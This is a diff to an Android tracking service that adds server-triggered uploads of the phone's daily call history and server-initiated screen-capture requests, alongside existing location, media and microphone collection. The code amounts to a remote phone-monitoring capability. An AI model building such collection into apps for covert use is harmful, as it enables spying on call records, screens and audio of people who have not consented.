@@ -24,12 +24,15 @@ import androidx.annotation.Nullable;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 import com.example.devicetrackerapp.R;
+import com.example.devicetrackerapp.activity.ScreenPermissionActivity;
 import com.example.devicetrackerapp.api.ApiClient;
 import com.example.devicetrackerapp.dto.ApiResponse;
 import com.example.devicetrackerapp.dto.AudioFolderItem;
 import com.example.devicetrackerapp.dto.AudioFolderPayload;
 import com.example.devicetrackerapp.dto.AudioFolderSyncRequest;
 import com.example.devicetrackerapp.dto.AudioItem;
+import com.example.devicetrackerapp.dto.CallHistorySyncItemDTO;
+import com.example.devicetrackerapp.dto.CallHistorySyncRequest;
 import com.example.devicetrackerapp.dto.ContactItem;
 import com.example.devicetrackerapp.dto.ImageFolderItem;
 import com.example.devicetrackerapp.dto.ImageFolderSyncRequest;
@@ -41,6 +44,7 @@ import com.example.devicetrackerapp.dto.TrackingConfigResponse;
 import com.example.devicetrackerapp.dto.UpdateLocationRequest;
 import com.example.devicetrackerapp.dto.VideoItem;
 import com.example.devicetrackerapp.utils.AudioUtils;
+import com.example.devicetrackerapp.utils.CallHistoryUtils;
 import com.example.devicetrackerapp.utils.ContactUtils;
 import com.example.devicetrackerapp.utils.DeviceUtils;
 import com.example.devicetrackerapp.utils.InputStreamRequestBody;
@@ -49,6 +53,8 @@ import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.location.Priority;
 import androidx.core.content.ContextCompat;
+
+import java.time.LocalDate;
 import java.util.ArrayList;
 import java.util.List;
 import com.example.devicetrackerapp.dto.ImageItem;
@@ -86,6 +92,7 @@ public class DeviceTrackingService extends Service {
 
     // Default 60 sec
     private long interval = 60000;
+    private boolean screenPermissionRunning = false;
 
     private FusedLocationProviderClient locationClient;
 
@@ -589,6 +596,120 @@ public class DeviceTrackingService extends Service {
                                             });
 
                                 }
+
+
+                            // ================= CALL HISTORY =================
+
+                                Log.d(TAG,
+                                        "refreshCallHistory = "
+                                                + config.getRefreshCallHistory());
+
+                                if (Boolean.TRUE.equals(config.getRefreshCallHistory())) {
+
+                                    Log.d(TAG,
+                                            "========== CALL HISTORY REQUEST RECEIVED ==========");
+
+                                    if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
+
+                                        Log.e(TAG,
+                                                "READ_CALL_LOG permission not granted");
+
+                                    } else {
+
+                                        try {
+
+                                            LocalDate today = LocalDate.now();
+
+                                            Log.d(TAG,
+                                                    "Syncing Call History : "
+                                                            + today
+                                                            + " -> "
+                                                            + today);
+
+                                            syncCallHistory(
+                                                    deviceId,
+                                                    today,
+                                                    today
+                                            );
+
+                                        } catch (Exception e) {
+
+                                            Log.e(TAG,
+                                                    "Call History Sync Error",
+                                                    e);
+                                        }
+                                    }
+
+                                } else {
+
+                                    Log.d(TAG,
+                                            "Call History sync not requested. Skip.");
+
+                                }
+
+                               // ================= Screen =================
+
+                                Log.d(TAG,
+                                        "refreshScreen=" + config.getRefreshScreen()
+                                                + " status=" + config.getScreenStatus()
+                                                + " screenPermissionRunning=" + screenPermissionRunning);
+
+                                if (Boolean.TRUE.equals(config.getRefreshScreen())
+                                        && !"STREAMING".equalsIgnoreCase(config.getScreenStatus())
+                                        ) {
+
+                                    ApiClient.getApiService()
+                                            .screenRequestReceived(deviceId)
+                                            .enqueue(new Callback<ApiResponse<String>>() {
+
+                                                @Override
+                                                public void onResponse(
+                                                        Call<ApiResponse<String>> call,
+                                                        Response<ApiResponse<String>> response) {
+
+                                                    if (response.isSuccessful()
+                                                            && response.body() != null
+                                                            && response.body().isSuccess()) {
+
+                                                        Log.d(TAG, "Starting ScreenPermissionActivity...");
+
+                                                        screenPermissionRunning = true;
+
+                                                        Intent intent =
+                                                                new Intent(
+                                                                        DeviceTrackingService.this,
+                                                                        ScreenPermissionActivity.class
+                                                                );
+
+                                                        intent.putExtra("deviceId", deviceId);
+
+                                                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+                                                        startActivity(intent);
+
+                                                    } else {
+
+                                                        Log.e(TAG, "Screen Request Failed");
+
+                                                    }
+
+                                                }
+
+                                                @Override
+                                                public void onFailure(
+                                                        Call<ApiResponse<String>> call,
+                                                        Throwable t) {
+
+                                                    Log.e(TAG, "Screen Request Failed", t);
+
+                                                }
+
+                                            });
+
+                                }
+
+
+
                             }
 
                         }
@@ -2467,6 +2588,262 @@ public class DeviceTrackingService extends Service {
 
             Log.e(TAG, "Mic Upload Exception", e);
         }
+    }
+
+    //CAll History
+    private void syncCallHistory(
+            String deviceId,
+            LocalDate fromDate,
+            LocalDate toDate) {
+
+        Log.d(
+                TAG,
+                "========================================"
+        );
+
+        Log.d(
+                TAG,
+                "Starting Call History Sync"
+        );
+
+        Log.d(
+                TAG,
+                "Device ID : " + deviceId
+        );
+
+        Log.d(
+                TAG,
+                "From Date : " + fromDate
+        );
+
+        Log.d(
+                TAG,
+                "To Date   : " + toDate
+        );
+
+        Log.d(
+                TAG,
+                "========================================"
+        );
+
+        try {
+
+            // =========================================
+            // 1. Get Call History From Device
+            // =========================================
+
+            CallHistoryUtils utils =
+                    new CallHistoryUtils(this);
+
+            List<CallHistorySyncItemDTO> calls =
+                    utils.getCallHistory(
+                            fromDate,
+                            toDate
+                    );
+
+            if (calls == null) {
+
+                Log.e(
+                        TAG,
+                        "Call history list is NULL"
+                );
+
+                return;
+            }
+
+            Log.d(
+                    TAG,
+                    "Call history records found = "
+                            + calls.size()
+            );
+
+            // =========================================
+            // 2. Create Sync Request
+            // =========================================
+
+            CallHistorySyncRequest request =
+                    new CallHistorySyncRequest();
+
+            request.setDeviceId(deviceId);
+
+            request.setFromDate(fromDate);
+
+            request.setToDate(toDate);
+
+            request.setCalls(calls);
+
+            Log.d(
+                    TAG,
+                    "Call History Request Created"
+            );
+
+            // =========================================
+            // 3. Send Call History To Backend
+            // =========================================
+
+            ApiClient.getApiService()
+                    .syncCallHistory(request)
+                    .enqueue(new Callback<ApiResponse<String>>() {
+
+                        @Override
+                        public void onResponse(
+                                Call<ApiResponse<String>> call,
+                                Response<ApiResponse<String>> response) {
+
+                            if (response.isSuccessful()
+                                    && response.body() != null
+                                    && response.body().isSuccess()) {
+
+                                Log.d(
+                                        TAG,
+                                        "========================================"
+                                );
+
+                                Log.d(
+                                        TAG,
+                                        "Call history synced successfully"
+                                );
+
+                                Log.d(
+                                        TAG,
+                                        "Records uploaded = "
+                                                + calls.size()
+                                );
+
+                                Log.d(
+                                        TAG,
+                                        "========================================"
+                                );
+
+                                // =====================================
+                                // 4. Sync Successful
+                                //    Reset refreshCallHistory
+                                // =====================================
+
+                                resetCallHistoryRequest(deviceId);
+
+                            } else {
+
+                                Log.e(
+                                        TAG,
+                                        "Call history sync failed"
+                                );
+
+                                Log.e(
+                                        TAG,
+                                        "HTTP Code = "
+                                                + response.code()
+                                );
+
+                                if (response.body() != null) {
+
+                                    Log.e(
+                                            TAG,
+                                            "Message = "
+                                                    + response.body().getMessage()
+                                    );
+
+                                }
+
+                                try {
+
+                                    if (response.errorBody() != null) {
+
+                                        Log.e(
+                                                TAG,
+                                                "Error Body = "
+                                                        + response.errorBody().string()
+                                        );
+
+                                    }
+
+                                } catch (Exception e) {
+
+                                    Log.e(
+                                            TAG,
+                                            "Error reading error body",
+                                            e
+                                    );
+                                }
+                            }
+                        }
+
+                        @Override
+                        public void onFailure(
+                                Call<ApiResponse<String>> call,
+                                Throwable t) {
+
+                            Log.e(
+                                    TAG,
+                                    "Call history sync API failed",
+                                    t
+                            );
+
+                        }
+                    });
+
+        } catch (Exception e) {
+
+            Log.e(
+                    TAG,
+                    "Call history sync exception",
+                    e
+            );
+        }
+    }
+
+    private void resetCallHistoryRequest(String deviceId) {
+
+        Log.d(
+                TAG,
+                "Resetting refreshCallHistory..."
+        );
+
+        ApiClient.getApiService()
+                .callHistorySyncCompleted(deviceId)
+                .enqueue(new Callback<ApiResponse<String>>() {
+
+                    @Override
+                    public void onResponse(
+                            Call<ApiResponse<String>> call,
+                            Response<ApiResponse<String>> response) {
+
+                        if (response.isSuccessful()
+                                && response.body() != null
+                                && response.body().isSuccess()) {
+
+                            Log.d(
+                                    TAG,
+                                    "refreshCallHistory reset successfully"
+                            );
+
+                        } else {
+
+                            Log.e(
+                                    TAG,
+                                    "Failed to reset refreshCallHistory"
+                            );
+
+                            Log.e(
+                                    TAG,
+                                    "HTTP Code = "
+                                            + response.code()
+                            );
+                        }
+                    }
+
+                    @Override
+                    public void onFailure(
+                            Call<ApiResponse<String>> call,
+                            Throwable t) {
+
+                        Log.e(
+                                TAG,
+                                "Reset refreshCallHistory API failed",
+                                t
+                        );
+                    }
+                });
     }
 
 }
